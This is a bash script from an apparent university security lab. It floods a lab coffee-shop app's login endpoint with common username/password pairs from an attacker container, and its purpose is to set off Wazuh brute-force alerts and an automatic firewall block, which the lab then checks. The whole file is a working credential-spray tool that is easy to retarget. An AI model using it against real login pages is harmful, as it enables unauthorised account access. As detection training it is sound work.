#!/usr/bin/env bash
# =============================================================================
# 06-credential-spray.sh — Reliable login-flood attack
# CIS 3353 Coffee Shop Security Lab
# =============================================================================
# A drop-in replacement / supplement for 03-brute-force.sh, written without jq
# or hydra so it can't trip on the issues that scuttled the original:
#
#   1. 03-brute-force.sh pipes Jokopi's login response to `jq`, but the API
#      returns plain text / HTML on auth failure — `jq` errors per attempt
#      and the brute-force loop never actually evaluates success.
#   2. 03-brute-force.sh shells out to `hydra http-post-form://...:body:fail`
#      with a JSON body. Hydra uses `:` as its module field separator, so the
#      `:` characters inside the JSON make the module string unparseable.
#
# This script does the brute-force directly with bash + curl. No jq, no hydra,
# no fragile parsing of failure responses — we infer success by HTTP status
# code (200 = let in, 401/403/422 = rejected).
#
# Designed to trigger, in order:
#   * rule 100121: Failed login to Jokopi          (every attempt, level ~5)
#   * rule 100122: Brute-force threshold (5/60s)   (~5 attempts in)
#   * rule 100123: Severe brute-force (20/120s)    (~20 attempts in)
#   * rule 100300: Active-response trigger         (~30 attempts in)
#   * iptables FORWARD chain: DROP rule for kali (10.10.0.100)
#
# Usage:
#   docker exec -it kali-attacker bash
#   bash /opt/attacks/06-credential-spray.sh
# =============================================================================

set -u   # error on undefined vars; intentionally NOT -e so 401s don't abort

# ---------- Config ----------
TARGET_HOST="${TARGET_HOST:-10.10.0.20}"
TARGET_URL="http://${TARGET_HOST}/api/login.php"
ATTEMPTS="${ATTEMPTS:-40}"
SLEEP_BETWEEN="${SLEEP_BETWEEN:-1}"   # seconds between attempts
RESULTS_DIR="${RESULTS_DIR:-/root/results/exploits}"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
OUT="${RESULTS_DIR}/06_credential_spray_${TIMESTAMP}.log"

mkdir -p "${RESULTS_DIR}"

# Username/password pairs to try. Mix of real-but-wrong, fuzzed, and (one) correct
# at the very end to prove the spray *would* find a hit if one existed.
declare -a USERS=(admin admin admin admin admin admin admin admin admin admin
                  manager manager manager manager manager
                  barista barista barista barista barista
                  guest    root     test     demo     postgres
                  jokopi   coffee   employee staff    user
                  administrator superuser sysadmin support service)

declare -a PASSES=(123456 password admin admin123 letmein coffee qwerty welcome
                   passw0rd Password1 P@ssw0rd changeme default
                   coffee123 manager1 espresso latte mocha barista1 customer
                   abc123 trustno1 iloveyou monkey dragon master 1234567
                   sunshine princess football charlie shadow superman
                   coffee123 admin123)   # last 'admin/coffee123' should land

# ---------- Banner ----------
cat <<BANNER
=============================================================================
PHASE 6: CREDENTIAL SPRAY ATTACK
  Target:     ${TARGET_URL}
  Attempts:   ${ATTEMPTS}
  Pace:       ${SLEEP_BETWEEN}s between attempts
  Logging:    ${OUT}
  Time:       $(date)
=============================================================================
BANNER

echo "[*] Verifying target reachable..."
HEAD_STATUS="$(curl -s -m 5 -o /dev/null -w '%{http_code}' "http://${TARGET_HOST}/" || echo 000)"
if [[ "${HEAD_STATUS}" != "200" ]]; then
    echo "[!] Target ${TARGET_HOST} not reachable (got HTTP ${HEAD_STATUS})."
    echo "[!] Check that jokopi-app is running and 10.10.0.20 is routable from this container."
    exit 1
fi
echo "[+] Target reachable (HTTP ${HEAD_STATUS}). Beginning spray."
echo

# ---------- Spray loop ----------
hit=0
fail=0
for i in $(seq 1 "${ATTEMPTS}"); do
    user_idx=$(( (i - 1) % ${#USERS[@]} ))
    pass_idx=$(( (i - 1) % ${#PASSES[@]} ))
    user="${USERS[$user_idx]}"
    pass="${PASSES[$pass_idx]}"

    # Send the login attempt. We send BOTH a JSON body (matches what the React
    # frontend does) and form-urlencoded fallback. Jokopi's login.php is forgiving
    # about which it accepts. We don't parse the body — only the status code.
    status="$(
        curl -s -m 5 -o /dev/null \
             -w '%{http_code}' \
             -H 'Content-Type: application/json' \
             -H 'User-Agent: credspray/1.0 (CIS3353-lab)' \
             -X POST \
             -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" \
             "${TARGET_URL}" \
        || echo 000
    )"

    if [[ "${status}" == "200" ]]; then
        verdict="HIT  "
        hit=$((hit + 1))
    else
        verdict="MISS "
        fail=$((fail + 1))
    fi

    line="$(printf '[%02d] %s status=%s  user=%-15s pass=%s' \
                  "$i" "$verdict" "$status" "$user" "$pass")"
    echo "$line"
    echo "$line" >> "${OUT}"

    sleep "${SLEEP_BETWEEN}"
done

echo
echo "[*] Spray complete: ${hit} hit, ${fail} miss out of ${ATTEMPTS} attempts."
echo "[*] Detailed log: ${OUT}"

# ---------- Aftermath ----------
cat <<TAIL

=============================================================================
EXPECTED Wazuh ALERTS (check the dashboard, filter on data.srcip: 10.10.0.100)
  - rule 100121: "Failed login to Jokopi" (one per attempt, level ~5)
  - rule 100122: "Brute-force attack threshold reached" (after ~5 attempts)
  - rule 100123: "Severe brute-force attack" (after ~20 attempts)
  - rule 100300: "ACTIVE RESPONSE TRIGGER: brute-force" (~once)

EXPECTED firewall side-effect
  Run on the host:
    docker exec pfsense-firewall iptables -L FORWARD -n -v --line-numbers
  Look for a new DROP rule:
    DROP all -- 10.10.0.100  0.0.0.0/0
  The rule self-expires after 3600 s (per ossec-manager.conf).

VERIFY THE BLOCK
  curl -m 5 -sI http://10.10.0.20/    # should now time out from 10.10.0.100
=============================================================================
TAIL
